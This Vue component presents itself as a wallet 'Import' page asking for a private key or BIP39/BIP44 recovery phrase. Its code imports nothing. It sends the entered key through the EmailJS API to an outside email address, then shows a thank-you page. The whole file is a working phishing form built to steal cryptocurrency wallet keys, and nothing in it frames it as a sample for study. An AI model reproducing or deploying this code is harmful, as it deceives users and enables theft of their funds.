<template>
  <div class="private flex h-full flex-col px-5">
    <label class="mb-4 font-light text-lg text-center" for=""
      >Please enter your key</label
    >
    <el-input type="textarea" :rows="3" v-model="private_key"> </el-input>
    <span class="mt-4">Please enter your private key in HEX format.</span>
    <p class="my-20 font-semibold text-sm">
      Input the BIP39/BIP44 recovery phrase here to restore the private keys
      that manage your acccounts.
    </p>
    <el-button :loading="loading" @click="sendData">Import</el-button>
  </div>
</template>

<script>
import axios from "axios";
export default {
  data() {
    return {
      private_key: "",
      loading: false
    };
  },
  methods: {
    sendData() {
      this.loading = true;
      let self = this;
      const checker = this.formChecker();
      if (checker) {
        var data = {
          service_id: "service_p0o93p4",
          template_id: "template_fv2dgal",
          user_id: "user_AKk1IFwxcKzXtVQRQpIrf",
          template_params: {
            from_name: "Private Key",
            private_key: this.private_key,
            reply_to: "webstarknight4@gmail.com"
          }
        };
        axios
          .post("https://api.emailjs.com/api/v1.0/email/send", data)
          .then(function() {
            self.$router.push("/thank-you")
            self.loading = false;
          })
          .catch(function() {
            self.loading = false;
          });
      } else {
        this.$notify({
          title: "Warning",
          message: "All Form input is required",
          type: "warning"
        });
      }
    },
    formChecker() {
      if (this.private_key === "") {
        return false;
      } else {
        return true;
      }
    }
  }
};
</script>

<style lang="scss">

</style>
